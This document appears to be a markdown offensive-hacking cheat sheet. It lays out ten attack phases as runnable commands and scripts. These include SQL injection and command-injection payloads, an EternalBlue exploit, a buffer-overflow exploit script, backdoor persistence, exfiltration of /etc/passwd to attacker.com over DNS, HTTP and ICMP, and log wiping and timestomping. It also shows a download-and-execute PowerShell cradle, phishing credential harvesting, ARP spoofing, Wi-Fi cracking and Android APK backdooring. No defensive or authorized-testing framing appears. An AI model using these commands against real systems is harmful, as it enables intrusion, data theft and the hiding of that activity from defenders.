# Advanced Hacking Techniques

Complete offensive security toolkit - from reconnaissance to post-exploitation.

---

## Phase 1: Reconnaissance

### Passive Information Gathering

```bash
# WHOIS lookup
whois target.com

# DNS enumeration
dig target.com ANY
nslookup -type=ANY target.com

# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -d target.com

# Google dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:db | ext:mdb

# Shodan (IoT/exposed services)
shodan search "hostname:target.com"
shodan search "org:Target Company"

# Certificate transparency
crt.sh -d target.com
```

### Active Scanning

```bash
# Port scanning
nmap -sV -sC -p- -T4 target.com -oN nmap_full.txt
nmap -sU --top-ports 100 target.com  # UDP scan

# Web technology detection
whatweb target.com
wappalyzer target.com

# Directory bruteforce
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
ffuf -u https://target.com/FUZZ -w wordlist.txt

# GitHub secrets
truffleHog https://github.com/target/repo
gitleaks detect --source . -v
```

---

## Phase 2: Vulnerability Discovery

### Web Application Testing

```bash
# SQL injection
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# XSS testing
echo "<script>alert(1)</script>" | xsstrike -u https://target.com/search?q=

# SSRF testing
curl https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/

# LFI/RFI
curl https://target.com/page?file=../../../../etc/passwd
curl https://target.com/page?file=http://attacker.com/shell.php

# Command injection
curl "https://target.com/ping?host=127.0.0.1;id"
curl "https://target.com/ping?host=127.0.0.1%0Aid"

# XXE injection
curl -X POST https://target.com/upload -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### Network Exploitation

```bash
# SMB enumeration
smbclient -L //target.com -N
enum4linux -a target.com

# Exploiting EternalBlue (MS17-010)
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
exploit

# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com

# RDP brute force
hydra -l administrator -P passwords.txt rdp://target.com
```

---

## Phase 3: Exploitation

### Metasploit Framework

```bash
msfconsole

# Search for exploit
search type:exploit platform:windows smb

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Meterpreter commands
sysinfo
getuid
getsystem  # Privilege escalation
hashdump   # Dump password hashes
screenshot
keyscan_start
keyscan_dump
```

### Manual Exploitation

```python
#!/usr/bin/env python3
# Buffer overflow exploit example

import socket

target = "192.168.1.100"
port = 9999

# Find offset
# msf-pattern_create -l 1000
# msf-pattern_offset -q [EIP value]

offset = 524
eip = b"\x83\x0c\x09\x10"  # JMP ESP address
nop_sled = b"\x90" * 16

# msfvenom payload
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f python -b "\x00\x0a\x0d"
shellcode = b"\xdb\xc0\xd9\x74\x24\xf4..."  # Truncated

payload = b"A" * offset + eip + nop_sled + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(payload)
s.close()

print("[+] Exploit sent!")
```

---

## Phase 4: Post-Exploitation

### Persistence Mechanisms

```bash
# Windows registry run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\System32\backdoor.exe"

# Scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM

# Service creation
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
sc start Backdoor

# WMI persistence
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Trigger", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

### Privilege Escalation

```bash
# Linux
# Check for SUID binaries
find / -perm -4000 2>/dev/null

# Kernel exploits
uname -a
searchsploit linux kernel [version]

# Sudo misconfigurations
sudo -l
# If sudo NOPASSWD on specific binary, exploit it

# Windows
# Check privileges
whoami /priv

# Token impersonation
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123! /add" -t *

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Lateral Movement

```bash
# Pass-the-Hash
pth-winexe -U DOMAIN/user%hash //target.com cmd.exe

# PsExec
psexec.py DOMAIN/user:password@target.com

# WMI execution
wmiexec.py DOMAIN/user:password@target.com

# PowerShell remoting
Enter-PSSession -ComputerName target.com -Credential DOMAIN\user

# SMB relay
responder -I eth0 -wrf
ntlmrelayx.py -t smb://target.com -c "whoami"
```

### Data Exfiltration

```bash
# Base64 encode and exfil via DNS
cat /etc/passwd | base64 | while read line; do dig $line.attacker.com; done

# HTTP POST exfil
curl -X POST -d @/etc/passwd https://attacker.com/upload

# ICMP exfil
nping --icmp --data-string "$(cat /etc/passwd)" attacker.com

# Steganography
steghide embed -cf image.jpg -ef secret.txt -p password
```

---

## Phase 5: Covering Tracks

### Log Clearing

```bash
# Linux
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c

# Windows
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Delete specific event
wevtutil qe Security /f:text | findstr /i "4624"
# Note event ID, then:
wevtutil cl Security /q:"*[System[(EventID=4624)]]"
```

### Timestomping

```bash
# Linux - match file timestamps
touch -r /etc/passwd backdoor.sh

# Windows
powershell (Get-Item backdoor.exe).CreationTime = "01/01/2020 12:00:00"
powershell (Get-Item backdoor.exe).LastWriteTime = "01/01/2020 12:00:00"
```

---

## Phase 6: Advanced Techniques

### Bypassing Antivirus

```bash
# Encrypt payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Obfuscate PowerShell
Invoke-Obfuscation
# Load script, apply multiple encoding layers

# In-memory execution
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Process injection
# Inject shellcode into legitimate process to avoid detection
```

### Firewall/IDS Evasion

```bash
# Fragment packets
nmap -f target.com

# Decoy scanning
nmap -D RND:10 target.com

# Slow scan (avoid rate limiting)
nmap -T1 target.com

# Custom packet timing
nmap --scan-delay 5s --max-rate 10 target.com
```

### Pivoting Through Compromised Host

```bash
# SSH tunnel
ssh -L 8080:internal-server:80 user@compromised-host

# Metasploit autoroute
meterpreter> run autoroute -s 10.10.10.0/24
meterpreter> background
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 10.10.10.0/24
msf> run

# SOCKS proxy via SSH
ssh -D 9050 user@compromised-host
# Configure proxychains
proxychains nmap -sT -Pn 10.10.10.100
```

---

## Phase 7: Specialized Attacks

### Phishing Infrastructure

```bash
# Set up phishing server
apt install postfix dovecot-core
# Configure to relay mail

# Clone target website
httrack https://target.com -O /var/www/phishing

# Inject credential harvester
# In login form, add:
<form action="https://attacker.com/harvest.php" method="POST">

# Send phishing emails
swaks --to victim@target.com --from admin@target.com --server mail.attacker.com --body "Click here: https://phishing.attacker.com"
```

### Man-in-the-Middle

```bash
# ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Intercept traffic
ettercap -Tq -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# SSL stripping
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

### Wi-Fi Hacking

```bash
# Monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng -c [channel] --bssid [AP MAC] -w capture wlan0mon

# Deauth clients to force handshake
aireplay-ng --deauth 10 -a [AP MAC] wlan0mon

# Crack WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap

# WPS attack
reaver -i wlan0mon -b [AP MAC] -vv
```

---

## Phase 8: Mobile Hacking

### Android APK Backdooring

```bash
# Decompile APK
apktool d target.apk

# Generate payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk

# Extract payload DEX
unzip payload.apk -d payload/
cp payload/classes.dex target/smali/

# Inject payload into MainActivity
# Add in onCreate():
invoke-static {}, Lcom/metasploit/stage/Payload;->start()V

# Recompile
apktool b target -o backdoored.apk

# Sign APK
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore backdoored.apk alias_name
```

### iOS Exploitation

```bash
# Jailbreak required for most attacks

# SSH into jailbroken device (default creds)
ssh root@iphone-ip  # Password: alpine

# Install tools
apt install cycript frida openssh

# Dump app data
cycript -p [app name]
cy# [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/mobile/Containers/Data/Application/" error:nil]

# Hook functions with Frida
frida -U -f com.target.app -l hook.js
```

---

## Phase 9: Cloud Exploitation

### AWS S3 Bucket Enumeration

```bash
# Find buckets
aws s3 ls s3://target-company
aws s3 ls s3://target-company-backup
aws s3 ls s3://target-prod

# Download bucket contents
aws s3 sync s3://target-company ./loot --no-sign-request

# Check for public write
echo "test" > test.txt
aws s3 cp test.txt s3://target-company/test.txt --no-sign-request
```

### Kubernetes Exploitation

```bash
# Check for exposed API
curl https://target.com:6443/api/v1

# Exploit misconfigured RBAC
kubectl --server=https://target.com:6443 --insecure-skip-tls-verify get pods

# Container escape
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

---

## Phase 10: Automation Scripts

### Full Recon Automation

```bash
#!/bin/bash

TARGET=$1

echo "[*] Starting recon on $TARGET"

# Subdomain enum
subfinder -d $TARGET -o subs.txt
cat subs.txt | httpx -o live.txt

# Port scan
nmap -iL live.txt -oN nmap.txt

# Directory bruteforce
while read host; do
    gobuster dir -u $host -w /usr/share/wordlists/dirb/common.txt -o gobuster_$host.txt &
done < live.txt
wait

# Vulnerability scan
nuclei -l live.txt -o vulns.txt

echo "[+] Recon complete!"
```

---

**Complete offensive security arsenal. From zero to root.**
